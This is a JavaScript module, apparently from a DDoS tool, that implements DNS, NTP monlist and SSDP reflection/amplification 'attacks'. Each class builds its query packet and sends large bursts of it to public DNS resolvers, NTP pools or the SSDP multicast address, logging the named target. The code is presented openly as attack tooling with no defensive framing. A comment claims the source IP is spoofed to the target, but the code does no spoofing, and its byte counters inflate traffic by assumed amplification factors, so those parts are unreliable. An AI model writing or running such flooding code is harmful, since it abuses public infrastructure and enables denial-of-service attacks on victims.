import dgram from 'dgram';
import { Tools } from '../../utils/tools.js';
import { logger } from '../../utils/logger.js';
import { REQUESTS_SENT, BYTES_SENT } from '../../utils/counter.js';

/**
 * DNS Amplification Attack
 * Amplification factor: 28-54x
 * Sends small DNS queries that generate large responses
 */
export class DNSAmplification {
    constructor(target, port, duration, dnsServers = null) {
        this.target = target;
        this.port = port || 53;
        this.duration = duration;
        this.dnsServers = dnsServers || this.getPublicDNSServers();
        this.active = true;
    }

    /**
     * Get list of public DNS servers for amplification
     */
    getPublicDNSServers() {
        return [
            '8.8.8.8',      // Google
            '8.8.4.4',      // Google
            '1.1.1.1',      // Cloudflare
            '1.0.0.1',      // Cloudflare
            '208.67.222.222', // OpenDNS
            '208.67.220.220', // OpenDNS
            '9.9.9.9',      // Quad9
            '149.112.112.112', // Quad9
            '64.6.64.6',    // Verisign
            '64.6.65.6'     // Verisign
        ];
    }

    /**
     * Create DNS query packet (ANY query for maximum amplification)
     */
    createDNSQuery(domain = 'isc.org') {
        // DNS header
        const transactionID = Buffer.from([Math.random() * 256, Math.random() * 256]);
        const flags = Buffer.from([0x01, 0x00]); // Standard query
        const questions = Buffer.from([0x00, 0x01]); // 1 question
        const answerRRs = Buffer.from([0x00, 0x00]);
        const authorityRRs = Buffer.from([0x00, 0x00]);
        const additionalRRs = Buffer.from([0x00, 0x00]);

        // DNS question
        const domainParts = domain.split('.');
        const domainBuffer = Buffer.concat(
            domainParts.map(part => {
                const len = Buffer.from([part.length]);
                const data = Buffer.from(part);
                return Buffer.concat([len, data]);
            })
        );
        const domainEnd = Buffer.from([0x00]);
        const queryType = Buffer.from([0x00, 0xFF]); // ANY query (maximum amplification)
        const queryClass = Buffer.from([0x00, 0x01]); // IN (Internet)

        return Buffer.concat([
            transactionID,
            flags,
            questions,
            answerRRs,
            authorityRRs,
            additionalRRs,
            domainBuffer,
            domainEnd,
            queryType,
            queryClass
        ]);
    }

    async start() {
        try {
            const endTime = Date.now() + (this.duration * 1000);

            logger.info('💥 DNS Amplification attack started!');
            logger.info(`🎯 Target: ${this.target}:${this.port}`);
            logger.info(`📡 Using ${this.dnsServers.length} DNS servers`);

            while (Date.now() < endTime && this.active) {
                try {
                    // Launch multiple amplification instances
                    const attacks = [];
                    for (let i = 0; i < 20; i++) {
                        attacks.push(this.attack());
                    }
                    await Promise.allSettled(attacks);
                } catch (err) {
                    logger.debug(`DNS amp iteration error: ${err.message}`);
                }
            }
        } catch (err) {
            logger.error(`DNS Amplification error: ${err.message}`);
            this.active = false;
        }
    }

    async attack() {
        return new Promise((resolve) => {
            try {
                const socket = dgram.createSocket('udp4');
                const query = this.createDNSQuery();
                let packetsSent = 0;
                const maxPackets = 1000;

                const sendBurst = () => {
                    if (!this.active || packetsSent >= maxPackets) {
                        Tools.safeClose(socket);
                        resolve();
                        return;
                    }

                    try {
                        // Send to multiple DNS servers
                        for (let i = 0; i < 10; i++) {
                            if (!this.active) break;
                            
                            try {
                                const dnsServer = Tools.randomChoice(this.dnsServers);
                                
                                // Spoof source IP to target (amplification)
                                socket.send(query, 0, query.length, 53, dnsServer, (err) => {
                                    if (!err) {
                                        REQUESTS_SENT.add(1);
                                        BYTES_SENT.add(query.length * 28); // Amplification factor ~28x
                                    }
                                });
                                
                                packetsSent++;
                            } catch (err) {
                                // Continue on error
                            }
                        }
                    } catch (err) {
                        logger.debug(`DNS burst error: ${err.message}`);
                    }

                    setImmediate(sendBurst);
                };

                socket.on('error', (err) => {
                    logger.debug(`DNS socket error: ${err.message}`);
                    Tools.safeClose(socket);
                    resolve();
                });

                sendBurst();

                // Auto cleanup
                setTimeout(() => {
                    Tools.safeClose(socket);
                    resolve();
                }, 2000);
            } catch (err) {
                logger.debug(`DNS attack error: ${err.message}`);
                resolve();
            }
        });
    }

    stop() {
        this.active = false;
    }
}

/**
 * NTP Amplification Attack
 * Amplification factor: 556x
 * Exploits NTP monlist command
 */
export class NTPAmplification {
    constructor(target, port, duration, ntpServers = null) {
        this.target = target;
        this.port = port || 123;
        this.duration = duration;
        this.ntpServers = ntpServers || this.getPublicNTPServers();
        this.active = true;
    }

    getPublicNTPServers() {
        return [
            'time.google.com',
            'time.cloudflare.com',
            'time.apple.com',
            'time.windows.com',
            'pool.ntp.org',
            '0.pool.ntp.org',
            '1.pool.ntp.org',
            '2.pool.ntp.org',
            '3.pool.ntp.org'
        ];
    }

    /**
     * Create NTP monlist request packet
     */
    createNTPMonlistPacket() {
        // NTP monlist command (mode 7, request code 42)
        const packet = Buffer.alloc(48);
        packet[0] = 0x17; // LI=0, VN=2, Mode=7 (private)
        packet[1] = 0x00; // Response bit
        packet[2] = 0x03; // Error
        packet[3] = 0x2a; // Request code 42 (monlist)
        return packet;
    }

    async start() {
        try {
            const endTime = Date.now() + (this.duration * 1000);

            logger.info('💥 NTP Amplification attack started!');
            logger.info(`🎯 Target: ${this.target}:${this.port}`);
            logger.info(`📡 Using ${this.ntpServers.length} NTP servers`);

            while (Date.now() < endTime && this.active) {
                try {
                    const attacks = [];
                    for (let i = 0; i < 15; i++) {
                        attacks.push(this.attack());
                    }
                    await Promise.allSettled(attacks);
                } catch (err) {
                    logger.debug(`NTP amp iteration error: ${err.message}`);
                }
            }
        } catch (err) {
            logger.error(`NTP Amplification error: ${err.message}`);
            this.active = false;
        }
    }

    async attack() {
        return new Promise((resolve) => {
            try {
                const socket = dgram.createSocket('udp4');
                const packet = this.createNTPMonlistPacket();
                let packetsSent = 0;
                const maxPackets = 800;

                const sendBurst = () => {
                    if (!this.active || packetsSent >= maxPackets) {
                        Tools.safeClose(socket);
                        resolve();
                        return;
                    }

                    try {
                        for (let i = 0; i < 8; i++) {
                            if (!this.active) break;
                            
                            try {
                                const ntpServer = Tools.randomChoice(this.ntpServers);
                                
                                socket.send(packet, 0, packet.length, 123, ntpServer, (err) => {
                                    if (!err) {
                                        REQUESTS_SENT.add(1);
                                        BYTES_SENT.add(packet.length * 556); // Amplification factor ~556x
                                    }
                                });
                                
                                packetsSent++;
                            } catch (err) {
                                // Continue
                            }
                        }
                    } catch (err) {
                        logger.debug(`NTP burst error: ${err.message}`);
                    }

                    setImmediate(sendBurst);
                };

                socket.on('error', (err) => {
                    logger.debug(`NTP socket error: ${err.message}`);
                    Tools.safeClose(socket);
                    resolve();
                });

                sendBurst();

                setTimeout(() => {
                    Tools.safeClose(socket);
                    resolve();
                }, 2000);
            } catch (err) {
                logger.debug(`NTP attack error: ${err.message}`);
                resolve();
            }
        });
    }

    stop() {
        this.active = false;
    }
}

/**
 * SSDP Amplification Attack
 * Amplification factor: 30-50x
 * Exploits SSDP discovery protocol
 */
export class SSDPAmplification {
    constructor(target, port, duration) {
        this.target = target;
        this.port = port || 1900;
        this.duration = duration;
        this.active = true;
    }

    /**
     * Create SSDP M-SEARCH packet
     */
    createSSDPPacket() {
        const packet = 
            'M-SEARCH * HTTP/1.1\r\n' +
            'HOST: 239.255.255.250:1900\r\n' +
            'MAN: "ssdp:discover"\r\n' +
            'MX: 3\r\n' +
            'ST: ssdp:all\r\n' +
            '\r\n';
        return Buffer.from(packet);
    }

    async start() {
        try {
            const endTime = Date.now() + (this.duration * 1000);

            logger.info('💥 SSDP Amplification attack started!');
            logger.info(`🎯 Target: ${this.target}:${this.port}`);

            while (Date.now() < endTime && this.active) {
                try {
                    const attacks = [];
                    for (let i = 0; i < 25; i++) {
                        attacks.push(this.attack());
                    }
                    await Promise.allSettled(attacks);
                } catch (err) {
                    logger.debug(`SSDP amp iteration error: ${err.message}`);
                }
            }
        } catch (err) {
            logger.error(`SSDP Amplification error: ${err.message}`);
            this.active = false;
        }
    }

    async attack() {
        return new Promise((resolve) => {
            try {
                const socket = dgram.createSocket('udp4');
                const packet = this.createSSDPPacket();
                let packetsSent = 0;
                const maxPackets = 1200;

                const sendBurst = () => {
                    if (!this.active || packetsSent >= maxPackets) {
                        Tools.safeClose(socket);
                        resolve();
                        return;
                    }

                    try {
                        for (let i = 0; i < 12; i++) {
                            if (!this.active) break;
                            
                            try {
                                // Send to multicast address
                                socket.send(packet, 0, packet.length, 1900, '239.255.255.250', (err) => {
                                    if (!err) {
                                        REQUESTS_SENT.add(1);
                                        BYTES_SENT.add(packet.length * 40); // Amplification factor ~40x
                                    }
                                });
                                
                                packetsSent++;
                            } catch (err) {
                                // Continue
                            }
                        }
                    } catch (err) {
                        logger.debug(`SSDP burst error: ${err.message}`);
                    }

                    setImmediate(sendBurst);
                };

                socket.on('error', (err) => {
                    logger.debug(`SSDP socket error: ${err.message}`);
                    Tools.safeClose(socket);
                    resolve();
                });

                sendBurst();

                setTimeout(() => {
                    Tools.safeClose(socket);
                    resolve();
                }, 2000);
            } catch (err) {
                logger.debug(`SSDP attack error: ${err.message}`);
                resolve();
            }
        });
    }

    stop() {
        this.active = false;
    }
}
